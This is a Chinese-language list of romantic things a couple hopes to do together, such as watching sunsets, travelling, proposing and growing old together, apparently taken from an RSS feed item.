手牵手逛街 一起看海 一起看雪 喂我吃东西 一起堆雪人 一起坐摩天轮 一起恶作剧 一起坐海盗船 吃同一杯冰淇淋 一起搬东西 一起布置我们的小窝 一起看日出 一起看恐怖片 送惊喜小礼物 为我做顿饭 一起看爱情片 一起看日落 一起数星星 一起洗衣服 一起听同一首曲子 在朋友面前介绍我 把肩膀借给我靠 为我擦眼泪 唱歌给我听 为我写篇日记 在大街上背我 随叫随到 一起看球赛 比赛啃西瓜 在沙滩上画心 一起没形象的大叫 一起熬夜玩游戏 为我系鞋带 一起拉粑 一起发呆 一起过我们的纪念日 一起做陶瓷 一起许愿 一起做蛋糕 学对方说话 一起模仿搞笑的事情 为我剪指甲 吃我剩下的饭饭 把你欺负的对我没辙 一起打水仗 一起拍照片 一起骑脚踏车 戴同一条围巾 戴同一双手套 讲故事哄我睡觉 一起吃棉花糖 一起唱歌 一起淋雨 一起面对所有难堪 一起爬山 一起露营 一起跑步 一起傻笑 一起吃路边摊 一起去猫咖 穿情侣装显摆 一起打羽毛球 一起吃爱吃的东西到吐 一起踩马路到脚软 一起去旅行 一起去动物园 咬一下你的脸颊 对我说晚安 一起看电影 一起买菜 比赛石头剪刀布 一起见对方的朋友 一起做鬼脸 一起走遍世界各地 一起吃大餐，牵手进去，扶墙出来 一起扎气球赢奖品 站在马路的两侧大喊 看你打场比赛 一起看演唱会 一起沿铁轨 一起坐地铁 一起放风筝 一起看花田 趁你睡觉偷亲你一下 一起放孔明灯 一起钓鱼 一起下棋 一起在烈日下暴晒 手机屏保设置对方的照片 一起敷面膜 一起捏对方的脸 打赌各种各样的事 一起看烟火 在树下埋下我们的约定 去海边放漂流瓶 拍一次婚纱照 求婚 结婚 完成人生各项大事 白头偕老</description></item></channel></rss>